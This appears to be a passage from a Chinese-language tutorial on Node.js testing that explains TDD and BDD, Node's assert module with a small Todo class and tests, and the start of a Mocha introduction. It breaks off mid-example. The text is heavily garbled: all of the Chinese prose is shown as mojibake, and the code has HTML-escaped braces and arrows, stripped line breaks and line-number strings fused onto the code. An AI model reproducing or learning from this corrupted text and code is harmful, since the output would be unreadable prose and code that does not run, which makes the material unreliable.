å’Œè¡Œä¸ºé©±åŠ¨å¼€å‘ï¼ˆBDDï¼‰ã€‚å®žäº‹æ±‚æ˜¯åœ°è®²ï¼ŒTDD å’Œ BDD åŸºæœ¬æ˜¯ä¸€æ ·çš„ï¼Œå®ƒä»¬çš„åŒºåˆ«åœ¨äºŽé£Žæ ¼ä¸Šã€‚è¿™ä¸ªæ˜¯å¦é‡è¦å–å†³äºŽä¸ªäººã€‚éªŒæ”¶æµ‹è¯•ä¸€èˆ¬æ˜¯å¯¹ Web ç¨‹åºè¿›è¡Œçš„é¢å¤–çš„æµ‹è¯•ï¼Œéœ€è¦ç”¨è„šæœ¬æŽ§åˆ¶æµè§ˆå™¨æ¥è§¦å‘ Web ç¨‹åºçš„åŠŸèƒ½ã€‚ TDD ä¸Ž BDDBDD ï¼šBehavior Driven Development è¡Œä¸ºé©±åŠ¨å¼€å‘æ˜¯ä¸€ç§æ•æ·è½¯ä»¶å¼€å‘çš„æŠ€æœ¯ï¼Œå®ƒé¼“åŠ±è½¯ä»¶é¡¹ç›®ä¸­çš„å¼€å‘äººå‘˜ã€QAå’ŒéžæŠ€æœ¯äººå‘˜ä¹‹é—´çš„åä½œã€‚ BDD çš„é‡ç‚¹æ˜¯é€šè¿‡ä¸Žåˆ©ç›Šç›¸å…³è€…çš„è®¨è®ºå–å¾—å¯¹é¢„æœŸè½¯ä»¶çš„è¡Œä¸ºçš„æ¸…é†’è®¤è¯†ã€‚å®ƒé€šè¿‡ç”¨è‡ªç„¶è¯­è¨€ä¹¦å†™éžç¨‹åºå‘˜å¯è¯»çš„æµ‹è¯•ç”¨ä¾‹æ‰©å±•äº†æµ‹è¯•é©±åŠ¨å¼€å‘è¡Œä¸ºã€‚è¡Œä¸ºé©±åŠ¨å¼€å‘äººå‘˜ä½¿ç”¨äº†æ··åˆé¢†åŸŸä¸­ç»Ÿä¸€çš„è¯­è¨€çš„æ¯è¯­è¯­è¨€æ¥æè¿°ä»–ä»¬çš„ä»£ç çš„ç›®çš„ã€‚è¿™è®©å¼€å‘è€…å–å¾—ä»¥æŠŠç²¾åŠ›é›†ä¸­åœ¨ä»£ç åº”è¯¥æ€Žä¹ˆå†™ï¼Œè€Œä¸æ˜¯æŠ€æœ¯ç»†èŠ‚ä¸Šï¼Œè€Œä¸”ä¹Ÿæœ€å¤§ç¨‹åº¦å‡å°‘äº†å°†ä»£ç ç¼–å†™è€…çš„æŠ€æœ¯è¯­è¨€ä¸Žå•†ä¸šå®¢æˆ·ã€ç”¨æˆ·ã€åˆ©ç›Šç›¸å…³è€…ã€é¡¹ç›®ç®¡ç†è€…ç­‰çš„é¢†åŸŸè¯­è¨€ä¹‹é—´æ¥å›žç¿»è¯‘çš„ä»£ä»·ã€‚ TDDï¼šTest-Driven Development å°±æ˜¯æµ‹è¯•é©±åŠ¨å¼€å‘ï¼Œå®ƒæ˜¯ä¸€ç§æµ‹è¯•å…ˆäºŽç¼–å†™ä»£ç çš„æ€æƒ³ï¼Œç”¨äºŽæŒ‡å¯¼è½¯ä»¶å¼€å‘ï¼Œæµ‹è¯•é©±åŠ¨å¼€å‘æ˜¯æ•æ·å¼€å‘ä¸­çš„ä¸€é¡¹æ ¸å¿ƒæ—¶é—´å’ŒæŠ€æœ¯ï¼Œä¹Ÿæ˜¯ä¸€ç§æ–¹æ³•è®ºï¼ŒTDDçš„åŽŸç†æ˜¯åœ¨å¼€å‘åŠŸèƒ½ä»£ç ä¹‹å‰ï¼Œå…ˆç¼–å†™å•å…ƒæµ‹è¯•ç”¨ä¾‹ï¼Œæµ‹è¯•ä»£ç ç¡®å®šéœ€è¦ç¼–å†™ä»€ä¹ˆäº§å“ä»£ç ã€‚ TDD çš„åŸºæœ¬æ€è·¯æ˜¯é€šè¿‡æµ‹è¯•æ¥æŽ¨åŠ¨æ•´ä¸ªå¼€å‘çš„è¿›è¡Œï¼Œä½†æµ‹è¯•é©±åŠ¨å¼€å‘å¹¶ä¸åªæ˜¯å•çº¯çš„æµ‹è¯•å·¥ä½œï¼Œè€Œæ˜¯æŠŠéœ€æ±‚åˆ†æžï¼Œè®¾è®¡ï¼Œè´¨é‡æŽ§åˆ¶é‡åŒ–çš„è¿‡ç¨‹ã€‚TDDçš„é‡è¦ç›®çš„ä¸ä»…ä»…æ˜¯æµ‹è¯•è½¯ä»¶ï¼Œæµ‹è¯•å·¥ä½œä¿è¯ä»£ç åªæ˜¯å…¶ä¸­ä¸€ä¸ªéƒ¨åˆ†ï¼Œè€Œä¸”åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¸®åŠ©å®¢æˆ·å’Œç¨‹åºå‘˜åŽ»é™¤æ¨¡æ£±ä¸¤å¯çš„éœ€æ±‚ã€‚TDD é¦–å…ˆè€ƒè™‘ä½¿ç”¨çš„éœ€æ±‚ï¼ˆå¯¹è±¡ã€åŠŸèƒ½ã€è¿‡ç¨‹ã€æŽ¥å£ç­‰ï¼‰ã€‚ä¸»è¦ç¼–å†™çš„æµ‹è¯•ç”¨ä¾‹æ¡†æž¶å¯¹åŠŸèƒ½çš„è¿‡ç¨‹å’ŒæŽ¥å£è¿›è¡Œè®¾è®¡ï¼Œè€Œæµ‹è¯•æ¡†æž¶å¯ä»¥æŒç»­è¿›è¡ŒéªŒè¯ã€‚ä¼˜ç‚¹æ˜¯åœ¨ä»»æ„ä¸€ä¸ªå¼€å‘èŠ‚ç‚¹éƒ½å¯ä»¥æ‹¿å‡ºä¸€ä¸ªä½¿ç”¨ï¼Œå«å°‘é‡bug å¹¶å…·æœ‰ä¸€å®šåŠŸèƒ½å’Œèƒ½å¤Ÿå‘å¸ƒçš„äº§å“ã€‚ç¼ºç‚¹æ˜¯å¢žåŠ ä»£ç é‡ï¼Œæµ‹è¯•ä»£ç æ˜¯ç³»ç»Ÿä»£ç çš„ä¸¤å€æˆ–è€…æ›´å¤šï¼Œä½†æ˜¯åŒæ—¶èŠ‚çœäº†è°ƒè¯•ç¨‹åºåŠæŒ‘é”™çš„æ—¶é—´ã€‚ TDD çš„åŽŸåˆ™ï¼š ç‹¬ç«‹æµ‹è¯•ï¼šä¸åŒçš„ä»£ç çš„æµ‹è¯•åº”è¯¥äº’ç›¸ç‹¬ç«‹ï¼Œä¸€ä¸ªç±»å¯¹åº”ä¸€ä¸ªæµ‹è¯•ç±»ï¼Œä¸€ä¸ªå‡½æ•°å¯¹åº”ä¸€ä¸ªæµ‹è¯•å‡½æ•°ã€‚ç”¨ä¾‹ä¹Ÿåº”å„è‡ªç‹¬ç«‹ï¼Œæ¯ä¸ªç”¨ä¾‹ä¸èƒ½ä½¿ç”¨å…¶ä»–ç”¨ä¾‹çš„ç»“æžœæ•°æ®ï¼Œç»“æžœä¹Ÿä¸èƒ½ä¾èµ–ç”¨ä¾‹æ‰§è¡Œé¡ºåºã€‚ä¸€ä¸ªè§’è‰²ï¼Œå¼€å‘è¿‡ç¨‹ä¸­åŒ…å«å¤šç§å·¥ä½œï¼Œåšä¸åŒå·¥ä½œæ—¶åº”ä¸“æ³¨äºŽå½“å‰çš„è§’è‰²ï¼Œä¸è¦è¿‡å¤šè€ƒè™‘å…¶ä»–æ–¹é¢çš„ç»†èŠ‚ æµ‹è¯•åˆ—è¡¨ï¼šä»£ç çš„åŠŸèƒ½ç‚¹å¯èƒ½å¾ˆå¤šï¼Œå¹¶ä¸”éœ€æ±‚å¯èƒ½æ˜¯é™†ç»­å‡ºçŽ°çš„ï¼Œä»»ä½•é˜¶æ®µæƒ³æ·»åŠ åŠŸèƒ½æ—¶ï¼Œåº”æŠŠå…ˆæŠŠåŠŸèƒ½ç‚¹åŠ åˆ°æµ‹è¯•åˆ—è¡¨ä¸­ï¼Œç„¶åŽæ‰èƒ½ç»§ç»­æ‰‹å¤´å·¥ä½œï¼Œé¿å…ç–æ¼ã€‚ æµ‹è¯•é©±åŠ¨ï¼šå³åˆ©ç”¨æµ‹è¯•æ¥é©±åŠ¨å¼€å‘ï¼Œæ˜¯ TDD çš„æ ¸å¿ƒã€‚è¦å®žçŽ°æŸä¸ªåŠŸèƒ½ï¼Œè¦ç¼–å†™æŸä¸ªç±»æˆ–æŸä¸ªå‡½æ•°ï¼Œåº”é¦–å…ˆç¼–å†™æµ‹è¯•ä»£ç ï¼Œæ˜Žç¡®è¿™ä¸ªç±»ã€å‡½æ•°å¦‚ä½•ä½¿ç”¨ã€æµ‹è¯•ï¼Œç„¶åŽå†å¯¹å…¶è¿›è¡Œè®¾è®¡ã€ç¼–ç ã€‚ å…ˆå†™æ–­è¨€ï¼šç¼–å†™æµ‹è¯•ä»£ç æ—¶ï¼Œåº”è¯¥é¦–å…ˆç¼–å†™åˆ¤æ–­ä»£ç åŠŸèƒ½çš„æ–­è¨€è¯­å¥ï¼Œç„¶åŽç¼–å†™å¿…è¦çš„è¾…åŠ©è¯­å¥ã€‚ å¯æµ‹è¯•æ€§ï¼šäº§å“ä»£ç è®¾è®¡ã€å¼€å‘æ—¶åº”å°½å¯èƒ½æé«˜å¯æµ‹æ€§ã€‚æ¯ä¸ªä»£ç å•å…ƒçš„åŠŸèƒ½åº”è¯¥æ¯”è¾ƒå•çº¯ï¼Œæ¯ä¸ªç±»åº”è¯¥åªåšå®ƒåº”è¯¥åšçš„äº‹æƒ…ï¼Œå°¤å…¶æ˜¯å¢žåŠ æ–°åŠŸèƒ½ï¼Œä¸è¦ä¸ºå›¾ä¸€æ—¶çš„ä¾¿åˆ©ï¼Œéšä¾¿åœ¨åŽŸæœ‰ä»£ç ä¸­æ·»åŠ åŠŸèƒ½ã€‚å¤šè€ƒè™‘ä½¿ç”¨å­ç±»ã€ç»§æ‰¿ã€é‡è½½çš„æ–¹æ³• åŠæ—¶é‡æž„ï¼šå¯¹ç»“æž„ä¸åˆç†ï¼Œé‡å¤ä¸å¥½çš„ä»£ç ï¼Œåœ¨æµ‹è¯•é€šè¿‡åŽï¼Œåº”åŠæ—¶è¿›è¡Œé‡æž„ã€‚ å°æ­¥å‰è¿›ï¼šè½¯ä»¶å¼€å‘æ˜¯å¤æ‚æ€§å¾ˆé«˜çš„å·¥ä½œï¼Œå°æ­¥å‰è¿›æ˜¯é™ä½Žå¤æ‚æ€§çš„æœ€å¥½çš„æ–¹æ³•ã€‚ å¯¹äºŽå•å…ƒæµ‹è¯•ï¼Œä¼šä»‹ç» Node çš„ assert æ¨¡å—ã€Mochaã€Vowsã€Should.js æ¡†æž¶å’Œ Chaiã€‚å¯¹äºŽéªŒæ”¶æµ‹è¯•ï¼Œæˆ‘ä»¬ä¼šä»‹ç»Node ä¸­ä½¿ç”¨ Seleniumã€‚ æµ‹è¯•ç±»åž‹ åˆ†ç±» å·¥å…· æè¿° å•å…ƒæµ‹è¯• TDD Mocha/Jasmine/Node ä¸­çš„ assert æ¨¡å—/Chai æµ‹è¯•ç¨‹åºé€»è¾‘ BDD Mocha/Vows/Chai/Should.js éªŒæ”¶æµ‹è¯• æµè§ˆå™¨ WebdriverIO/Selenium æµ‹è¯•ç¨‹åºç•Œé¢å’ŒåŠŸèƒ½ æ— å¤´ WebdriverIO/Phantom/Zombie.js å•å…ƒæµ‹è¯•å•å…ƒæµ‹è¯•æ˜¯æŒ‡é€šè¿‡ç¼–å†™ä»£ç æ¥æµ‹è¯•ç¨‹åºä¸­çš„å„ä¸ªéƒ¨åˆ†ã€‚ç¼–å†™æµ‹è¯•ä»£ç ä¼šè®©ä½ æ›´è®¤çœŸæ€è€ƒç¨‹åºçš„è®¾è®¡é€‰æ‹©ï¼Œå°½æ—©é¿å¼€å„ç§é™·é˜±ã€‚æµ‹è¯•è¿˜ä¼šè®©ä½ ç¡®ä¿¡è‡ªå·±æœ€è¿‘çš„ä¿®æ”¹æ²¡æœ‰å¼•å…¥é”™è¯¯ã€‚å°½ç®¡å•å…ƒæµ‹è¯•éœ€è¦åœ¨ç¼–ç æ—¶åšäº›å·¥ä½œï¼Œä½†ä»¥åŽæ¯æ¬¡ä¿®æ”¹ç¨‹åºåŽéƒ½ä¸ç”¨è‡ªå·±æ‰‹åŠ¨æµ‹è¯•äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯èƒ½èŠ‚çœå¾ˆå¤šæ—¶é—´çš„ã€‚ åšå•å…ƒæµ‹è¯•éœ€è¦äº›æŠ€å·§ï¼Œè€Œå¼‚æ­¥é€»è¾‘æœ‰å¸¦æ¥äº†æ–°çš„æŒ‘æˆ˜ã€‚å› ä¸ºå¼‚æ­¥å•å…ƒæµ‹è¯•å¯ä»¥å¹¶è¡Œè¿è¡Œï¼Œæ‰€ä»¥å¿…é¡»å°å¿ƒï¼Œç¡®ä¿æµ‹è¯•ä¸ä¼šäº’ç›¸å¹²æ‰°ã€‚æ¯”å¦‚è¯´ï¼Œå¦‚æžœæµ‹è¯•åœ¨ç¡¬ç›˜ä¸Šåˆ›å»ºäº†ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨å®Œæˆæµ‹è¯•åŽåˆ é™¤æ–‡ä»¶æ—¶ä¸€å®šè¦è°¨æ…Žï¼Œä»¥å…åˆ é™¤å¦å¤–ä¸€ä¸ªæœªå®Œæˆçš„æµ‹è¯•æ­£åœ¨ä½¿ç”¨è¿‡çš„æ–‡ä»¶ã€‚å› æ­¤å¾ˆå¤šå•å…ƒæµ‹è¯•æ¡†æž¶éƒ½æœ‰æµç¨‹æŽ§åˆ¶ï¼Œå¯ä»¥è®©æµ‹è¯•æŒ‰é¡ºåºè¿è¡Œã€‚ æœ¬èŠ‚ä»‹ç»çš„å†…å®¹ï¼š Node è‡ªå¸¦çš„ assert æ¨¡å— â€”â€” TDD é£Žæ ¼è‡ªåŠ¨åŒ–æµ‹è¯•çš„å·¥å…· Mocha â€”â€” ç›¸å¯¹æ¯”è¾ƒæ–°çš„æµ‹è¯•æ¡†æž¶ï¼Œå¯ä»¥ç”¨æ¥åš TDD- æˆ– BDD-é£Žæ ¼çš„æµ‹è¯• Vows â€”â€” å¾—åˆ°å¹¿æ³›åº”ç”¨çš„ BDD é£Žæ ¼æµ‹è¯•æ¡†æž¶ Should.js â€”â€” æž„å»ºåœ¨ Node assert æ¨¡å—ä¹‹ä¸Šçš„æ¨¡å—ï¼Œæä¾› BDD é£Žæ ¼çš„æ–­è¨€ assert æ¨¡å—assert æ¨¡å—æ˜¯ Node ä¸­å¤§å¤šæ•°å•å…ƒæµ‹è¯•çš„åŸºç¡€ï¼Œå®ƒå¯ä»¥æµ‹è¯•ä¸€ä¸ªæ¡ä»¶ï¼Œå¦‚æžœæ¡ä»¶æœªæ»¡è¶³ï¼Œåˆ™æŠ›å‡ºé”™è¯¯ã€‚å¾ˆå¤šç¬¬ä¸‰æ–¹æµ‹è¯•æ¡†æž¶éƒ½ç”¨åˆ°äº† assert æ¨¡å—ï¼Œç”šè‡³æ²¡æœ‰æµ‹è¯•æ¡†æž¶ä¹Ÿå¯ä»¥ç”¨å®ƒåšæµ‹è¯•ã€‚ ç®€å•çš„ä¾‹å­ï¼š å‡è®¾æœ‰ä¸€ä¸ªç®€å•çš„å¾…åŠžäº‹é¡¹ç¨‹åºï¼Œå®ƒæŠŠäº‹é¡¹å­˜åœ¨å†…å­˜é‡Œï¼Œè€Œä½ è¦æ–­è¨€å®ƒåšçš„æ˜¯ä½ è®¤ä¸ºå®ƒåšçš„ã€‚ ä¸‹é¢çš„ä»£ç å®šä¹‰çš„æ¨¡å—å®žçŽ°äº†ç¨‹åºçš„æ ¸å¿ƒåŠŸèƒ½ï¼ŒåŒ…æ‹¬å¾…åŠžäº‹é¡¹çš„åˆ›å»ºã€èŽ·å–å’Œåˆ é™¤ã€‚å®ƒè¿˜åŒ…æ‹¬ä¸€ä¸ªç®€å•çš„ doAsync æ–¹æ³•ï¼Œæ‰€ä»¥è¿˜å¯ä»¥çœ‹åˆ°å¦‚ä½•æµ‹è¯•å¼‚æ­¥æ–¹æ³•ã€‚ 123456789101112131415161718192021222324252627// todo.jsclass Todo &#123; constructor() &#123; // å®šä¹‰å¾…åŠžé¡¹æ•°æ®åº“ this.todos = []; &#125; add(item) &#123; if (!item) throw new Error('Todo.prototype.add requires an item'); this.todos.push(item); &#125; deleteAll() &#123; this.todos = []; &#125; get length() &#123; return this.todos.length; &#125; // ä¸¤ç§’åŽå¸¦ç€ true è°ƒç”¨å›žè°ƒ doAsync(cb) &#123; setTimeout(cb, 2000, true); &#125;&#125;module.exports = Todo; æŽ¥ä¸‹é‡Œç”¨ assert æ¨¡å—æµ‹è¯•è¿™æ®µä»£ç ï¼Œä¸‹é¢çš„ä»£ç åŠ è½½äº†å¿…éœ€æ¨¡å—ï¼Œåˆ›å»ºäº†æ–°çš„å¾…åŠžäº‹é¡¹åˆ—è¡¨ï¼Œè¿˜å£°æ˜Žä¸€ä¸ªå˜é‡è®°å½•å®Œæˆçš„æµ‹è¯•æ•°é‡ã€‚ 12345// test.jsconst assert = require('assert');const Todo = require('./todo');const todo = new Todo();let testsCompleted = 0; ç”¨ equal æ£€æŸ¥å˜é‡çš„å€¼ï¼Œæµ‹è¯•å¾…åŠžäº‹é¡¹ç¨‹åºçš„åˆ é™¤åŠŸèƒ½ 1234567891011// test.jsfunction deleteTest() &#123; // æ·»åŠ æ•°æ®æ¥åˆ é™¤ todo.add('Delete Me'); // æ–­è¨€æ•°æ®æ·»åŠ æˆåŠŸ assert.equal(todo.length, 1, '1 item should exist'); todo.deleteAll(); assert.equal(todo.length, 0, 'No items should exist'); // è®°å½•æµ‹è¯•å·²å®Œæˆ testsCompleted++;&#125; ä¸Šé¢çš„æµ‹è¯•æ·»åŠ ä¸€ä¸ªå¾…åŠžäº‹é¡¹ï¼Œç„¶åŽå†åˆ é™¤ï¼Œæ‰€ä»¥æœ€åŽåº”è¯¥æ²¡æœ‰å¾…åŠžäº‹é¡¹ã€‚å¦‚æžœç¨‹åºèƒ½æ­£å¸¸å·¥ä½œï¼Œé‚£ä¹ˆ todo.length çš„å€¼åº”è¯¥æ˜¯ 0ã€‚å¦‚æžœç¨‹åºå‡ºçŽ°é—®é¢˜ï¼Œåˆ™ä¼šæœ‰å¼‚å¸¸æŠ›å‡ºã€‚å¦‚æžœ todo.length ä¸æ˜¯ 0.é‚£ä¹ˆè¿™ä¸ªæ–­è¨€ä¼šåœ¨æ ˆè·Ÿè¸ªä¸­æ˜¾ç¤ºä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼Œåœ¨æŽ§åˆ¶å°ä¸­è¾“å‡º â€˜No items should existâ€œï¼Œåœ¨æ–­è¨€åŽé¢å°† testCompleted åŠ ä¸€ï¼Œè®°å½•å·²å®Œæˆäº†ä¸€æ¬¡æµ‹è¯•ã€‚ ç”¨ notEqual æ‰¾å‡ºé€»è¾‘ä¸­çš„é—®é¢˜ 1234567function addTest() &#123; todo.deleteAll(); todo.add('Added'); // æ–­è¨€æœ‰äº‹é¡¹å­˜åœ¨ assert.notEqual(todo.length, 0, '1 item should exist'); testsCompleted++;&#125; assest æ¨¡å—ä¸­è¿˜æœ‰ä¸€ä¸ª notEqual æ–­è¨€ï¼Œå½“ç¨‹åºäº§ç”Ÿç‰¹å®šçš„å€¼è¡¨æ˜Žé€»è¾‘æœ‰é—®é¢˜æ—¶ï¼Œå¯ä»¥é‡‡ç”¨è¿™ç§æ–­è¨€ã€‚ä¸Šé¢å±•ç¤ºäº†åœ¨åˆ é™¤æ‰€æœ‰å¾…åŠžäº‹é¡¹åˆæ·»åŠ äº†ä¸€ä¸ªäº‹é¡¹ï¼Œç„¶åŽå†èŽ·å–æ‰€æœ‰äº‹é¡¹ï¼Œå¦‚æžœäº‹é¡¹çš„æ•°é‡ä¸º0ï¼Œæ–­è¨€å°±ä¼šå¤±è´¥å¹¶æŠ›å‡ºå¼‚å¸¸ã€‚ å…¶ä»–åŠŸèƒ½ï¼šstrictEqualã€notStrictEqualã€deelEqualã€notDeepEqual é™¤äº† equal å’Œ notEqual ,assert æ¨¡å—è¿˜æä¾›äº†æ›´ä¸¥æ ¼çš„ç‰ˆæœ¬ï¼ŒstrictEqual å’Œ notStrictEqual,å®ƒä»¬åœ¨è¿›è¡Œåˆ¤æ–­æ—¶ç”¨çš„æ˜¯ä¸¥æ ¼çš„ç›¸ç­‰æ“ä½œç¬¦ ===ã€‚ assert æ¨¡å—ä¹Ÿæœ‰ç”¨æ¥æ¯”è¾ƒå¯¹è±¡çš„ deepEqual å’Œ notEqual ï¼Œè¿™äº›æ–­è¨€ä¸­çš„ deep è¡¨æ˜Žå®ƒä»¬ä¼šå±‚å±‚æ·±å…¥å¯¹ä¸¤ä¸ªå¯¹è±¡è¿›è¡Œæ¯”è¾ƒï¼Œæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„å±žæ€§ï¼Œå¦‚æžœå±žæ€§ä¹Ÿæ˜¯å¯¹è±¡ï¼Œåˆ™ä¼šç»§ç»­æ¯”è¾ƒå±žæ€§çš„å±žæ€§ã€‚ ç”¨ ok æµ‹è¯•å¼‚æ­¥å€¼æ˜¯å¦ä¸º true å› ä¸ºæ˜¯å¼‚æ­¥æµ‹è¯•ï¼Œæ‰€ä»¥è¦æä¾›ä¸€ä¸ªå›žè°ƒå‡½æ•°ï¼ˆcbï¼‰ï¼Œå‘æµ‹è¯•è¿è¡Œè€…å‘é€æµ‹è¯•ç»“æŸçš„ä¿¡å·â€”â€”ä¸èƒ½åƒåŒæ­¥æµ‹è¯•é‚£æ ·é è¿”å›žè¯­å¥æ¥è¡¨æ˜Žæµ‹è¯•ç»“æŸäº†ã€‚è¦åˆ¤æ–­ doAsync çš„ç»“æžœå€¼æ˜¯å¦ä¸º true,å¯ä»¥ç”¨ ok æ–­è¨€ï¼Œç”¨å®ƒåˆ¤æ–­ä¸€ä¸ªå€¼æ˜¯å¦ä¸º true å¾ˆå®¹æ˜“ã€‚ 12345678function doAsyncTest(cb) &#123; todo.doAsync(value =&gt; &#123; // æ–­è¨€å€¼ä¸º true assert.ok(value, 'Callback should be passed true'); testsCompleted++; cb(); &#125;);&#125; æµ‹è¯•èƒ½å¦æ­£ç¡®æŠ›å‡ºé”™è¯¯ assert æ¨¡å—è¿˜å¯ä»¥æ£€æŸ¥ç¨‹åºæŠ›å‡ºæ¶ˆæ¯ æ˜¯å¦æ­£ç¡®ã€‚throws è°ƒç”¨ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºè¦åœ¨é”™è¯¯æ¶ˆæ¯ä¸­æ£€æŸ¥æ–‡æœ¬ requires 1234function throwsTest(cb) &#123; assert.throws(todo.add, /requires/); testsCompleted++;&#125; è¿è¡Œæµ‹è¯• æµ‹è¯•å·²ç»å®šä¹‰å¥½äº†ï¼ŒæŽ¥ä¸‹æ¥è¦åœ¨æµ‹è¯•æ–‡ä»¶ä¸­æ·»åŠ è¿è¡Œè¿™äº›æµ‹è¯•çš„ä»£ç ï¼Œä¸‹é¢çš„ä»£ç ä¼šè¿è¡Œå‰é¢çš„å®šä¹‰çš„æ‰€æœ‰æµ‹è¯•ï¼Œç„¶åŽè¾“å‡ºå®Œæˆçš„æµ‹è¯•æ•°é‡ã€‚ 123456deleteTest();addTest();throwsTest();doAsyncTest(() =&gt; &#123; console.log(`Completed $&#123;testsCompleted&#125; tests`);&#125;) å¦‚æžœæµ‹è¯•æˆåŠŸäº†ï¼Œè„šæœ¬ä¼šå‘Šè¯‰ä½ ä»¥å®Œæˆçš„æµ‹è¯•æ•°é‡ã€‚è¦é˜²æ­¢æŸä¸ªæµ‹è¯•å‡ºé—®é¢˜ï¼Œå¯ä»¥è¿½è¸ªæµ‹è¯•çš„å¼€å§‹å’Œç»“æŸæ—¶é—´ã€‚æ¯”å¦‚è¯´ï¼ŒæŸä¸ªæµ‹è¯•å¯èƒ½æ²¡èƒ½æ‰§è¡Œåˆ°æ–­è¨€çš„åœ°æ–¹ã€‚ ä½¿ç”¨ Node è‡ªå¸¦çš„ assert æ¨¡å—æ—¶ï¼Œæ¯ä¸ªæµ‹è¯•ç”¨ä¾‹ä¸­éƒ½è¦åŒ…å«å¾ˆå¤šå¥—è·¯åŒ–çš„ä»£ç ç”¨ä»¥è®¾ç½®æµ‹è¯•ï¼ˆæ¯”å¦‚åˆ é™¤æ‰€æœ‰äº‹é¡¹ï¼‰ï¼Œè¿½è¸ªæµ‹è¯•è¿›ç¨‹ï¼ˆâ€™å·²å®Œæˆâ€˜è®¡æ•°å™¨ï¼‰ã€‚è¿™äº›å¥—è·¯åŒ–çš„ä»£ç ä¼šå ç”¨ç¼–å†™æµ‹è¯•ç”¨ä¾‹çš„æ—¶é—´å’Œç²¾åŠ›ã€‚å¦‚æžœèƒ½æŠŠè¿™äº›å·¥ä½œäº¤ç»™ä¸“ç”¨çš„æ¡†æž¶ï¼Œè®©ä½ çš„ç²¾åŠ›éƒ½æ”¾åœ¨ä¸šåŠ¡å‘˜é€»è¾‘çš„æµ‹è¯•ä¸Šå°±æ›´å¥½ã€‚æŽ¥ä¸‹æ¥ç”¨ Mocha,äº†è§£ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨è¿™ä¸ªç¬¬ä¸‰æ–¹å•çŽ‰æµ‹è¯•æ¡†æž¶è®© å·¥ä½œå˜å¾—æ›´åŠ è½»æ¾ã€‚ MochaMocha æ˜¯ä¸ªæµè¡Œçš„æµ‹è¯•æ¡†æž¶ï¼Œå¾ˆå®¹æ˜“ä¸Šæ‰‹ï¼Œå°½ç®¡ Mocha é»˜è®¤æ˜¯ BDD é£Žæ ¼çš„ã€‚ä½†ä¹Ÿå¯ä»¥ç”¨åœ¨ TDD é£Žæ ¼çš„æµ‹è¯•ä¸­ã€‚Mocha å…·æœ‰å¾ˆå¤šç‰¹æ€§ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡æ³„éœ²æ£€æµ‹å’Œå®¢æˆ·ç«¯æµ‹è¯•ã€‚ å…¨å±€å˜é‡æ³„éœ²æµ‹è¯• ä¸€èˆ¬åº”è¯¥ä¸éœ€è¦æ•´ä¸ªç¨‹åºèŒƒå›´å†…å…¨éƒ½å¯è¯»çš„å…¨å±€å˜é‡ï¼Œå¹¶ä¸”æŒ‰ç…§ç¼–ç¨‹æœ€ä½³å®žè·µæ¥è¯´ï¼Œè¦å°½é‡å°‘ç”¨å…¨å±€å˜é‡ã€‚ä½†åœ¨ ES5ä¸­ï¼Œä¸€ä¸å°å¿ƒå°±åˆ›å»ºäº†ä¸€ä¸ªå…¨å±€å˜é‡æ¥ï¼Œåªè¦åœ¨å£°æ˜Žå˜é‡æ—¶å¿˜è®°å†™ å…³é”®å­— var ï¼Œè¿™ä¸ªå˜é‡å°±æ˜¯å…¨å±€å˜é‡äº†ã€‚Mocha èƒ½å¤Ÿå‘çŽ°è¿™ç§ä¸å°å¿ƒåˆ›å»ºå‡ºæ¥çš„å…¨å±€å˜é‡æ³„éœ²ï¼Œå¦‚æžœä½ åˆ›å»ºäº†å…¨å±€å˜é‡ï¼Œå®ƒä¼šåœ¨æµ‹è¯•æ—¶æŠ›å‡ºé”™è¯¯ã€‚å¦‚æžœä½ æƒ³ç¦ç”¨å…¨å±€æ³„éœ²æ£€æŸ¥ï¼Œå¯ä»¥è¿è¡Œ mocha å‘½ä»¤æ—¶åŠ ä¸Š â€“ignored-leaks é€‰é¡¹ã€‚æ­¤å¤–ï¼Œå¦‚æžœè¦æŒ‡æ˜Žè¦ä½¿ç”¨çš„å‡ ä¸ªå…¨å±€å˜é‡ï¼Œå¯ä»¥æŠŠå®ƒä»¬æ”¾åœ¨ â€“globals åŽé¢ï¼Œç”¨é€—å·éš”å¼€ã€‚ Mocha æµ‹è¯•é»˜è®¤ä½¿ç”¨ BDD é£Žæ ¼çš„å‡½æ•°å®šä¹‰å’Œè®¾ç½®ï¼Œè¿™äº›å‡½æ•°åŒ…æ‹¬ describeã€itã€beforeã€afterã€beforeEachå’Œ afterEachï¼Œå¦å¤–ï¼ŒMocha ä¹Ÿæœ‰ TDD æŽ¥å£ï¼Œç”¨ suite ä»£æ›¿ describe,testä»£æ›¿ it,setup ä»£æ›¿ before ï¼Œteardown ä»£æ›¿ afterã€‚ ç”¨ Mochaæµ‹è¯• Node ç¨‹åº åˆå§‹åŒ– package.jsonï¼Œå®šä¹‰ scripts: 123"scripts": &#123; "test": "mocha" &#125;, å®‰è£…ä¾èµ–ï¼š 1npm i -S mocha æµ‹è¯•ä¼šæ”¾åœ¨ test ç›®å½•ä¸‹ã€‚Mocha é»˜è®¤ä½¿ç”¨ BDD æŽ¥å£,Mocha æµ‹è¯•çš„åŸºæœ¬ç»“æž„ 12345678// test/memdb.jsconst memdb = require('..');describe('memdb', () =&gt; &#123; describe('.saveSync(doc)', () =&gt; &#123; it('should save the document', () =&gt; &#123; &#125;); &#125;);&#125;); Mocha ä¹Ÿæ”¯æŒ TDD å’Œ qunit ä»¥åŠ exports é£Žæ ¼çš„æŽ¥å£ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ 123456789module.exports = &#123; 'memdb':&#123; '.saveSync(doc)':&#123; 'should save the document':()=&gt;&#123; &#125; &#125; &#125;&#125; è¿™äº›æŽ¥å£æä¾›çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¾ç„¶ç”¨çš„æ˜¯é»˜è®¤çš„ BDD æŽ¥å£ï¼Œä¸‹é¢æ˜¯ç¬¬ä¸€ä¸ªæµ‹è¯• 123456789101112const memdb = require('..');const assert = require('assert');describe('memdb', () =&gt; &#123; describe('.saveSync(doc)', () =&gt; &#123; it('should save the document', () =&gt; &#123; const pet = &#123; name: 'Tobi' &#125;; 